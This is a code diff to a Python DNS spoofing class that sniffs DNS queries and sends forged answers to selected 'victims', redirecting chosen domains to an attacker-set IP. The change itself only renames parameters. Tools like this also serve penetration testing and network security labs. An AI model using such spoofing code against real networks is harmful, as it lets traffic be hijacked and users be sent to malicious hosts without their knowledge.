@@ -7,19 +7,19 @@ import threading
 
 class DNSSpoofing(threading.Thread):
 
-    def __init__(self, interface: list, domain_names: list, hosts: list, redirect_IP: str):
+    def __init__(self, interface: str, domain_names: list, victims: list, redirect_IP: str):
         """
         Starts DNS spoofing in a background thread
 
             :param interface: interface on which DNS requests will be sniffed
             :param domain_names: list of the domain names to be spoofed, empty list means all domains will be spoofed
-            :param hosts: list of the hosts to be spoofed, empty list means all hosts will be spoofed
+            :param victims: list of the hosts to be spoofed, empty list means all hosts will be spoofed
             :param redirect_IP: IP address that will be used to poison the DNS cache of spoofed hosts
         """
         super(DNSSpoofing, self).__init__()
         self.interface = interface
         self.domain_names = domain_names
-        self.hosts = hosts
+        self.victims = victims
         self.redirect_IP = redirect_IP
         self._stop = threading.Event()
 
@@ -64,7 +64,7 @@ class DNSSpoofing(threading.Thread):
             if not (packet[DNSQR].qname.decode("utf8") in self.domain_names):
                 return
             # Packet sent by a target host?
-            if not (packet[IP].src in self.hosts):
+            if not (packet[IP].src in self.victims):
                 return
 
             spoofed_ans = create_spoofed_dns_answer(self.redirect_IP, packet)
